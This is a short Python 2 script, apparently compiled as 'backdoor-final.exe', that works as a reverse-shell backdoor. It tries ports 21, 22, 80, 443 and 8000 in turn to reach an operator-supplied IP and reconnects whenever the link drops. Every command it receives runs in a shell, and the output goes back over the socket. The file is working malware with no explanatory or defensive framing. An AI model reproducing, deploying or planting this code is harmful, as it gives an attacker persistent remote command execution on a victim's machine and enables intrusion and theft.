import sys,socket,time,subprocess

if len(sys.argv)<=1:
    print "Please specify an IP Address.\n\n"
    print "backdoor-final.exe <IP ADDRESS> [Optional Port]"
    sys.exit(0)

ports_to_scan=[21,22,80,443,8000]
if len(sys.argv)==3:
    ports_to_scan=[int(sys.argv[2]),21,22,80,443,8000]

def ScanAndConnect():
    print "it started"
    connected=False
    while not connected:
        for port in ports_to_scan:
            time.sleep(1)
            try:
                print "Trying",port,
                mysocket.connect((sys.argv[1],port))
            except socket.error:
                print "Nope"
                continue
            else:
                print "Connected"
                connected=True
                break

mysocket=socket.socket()
ScanAndConnect()
while True:
    try: 
        commandrequested=mysocket.recv(1024)
        if len(commandrequested)==0:
            time.sleep(3)
            mysocket=socket.socket()
            ScanAndConnect()
            continue
        if commandrequested[:4]=="QUIT":
            mysocket.send("Terminating Connection.")
            break
        prochandle = subprocess.Popen(commandrequested,  shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) 
        prochandle.wait()
        results = prochandle.stdout.read() + prochandle.stderr.read()
        mysocket.send(results)
    except socket.error:
        break
    except Exception as e:
        mysocket.send(str(e))
        break
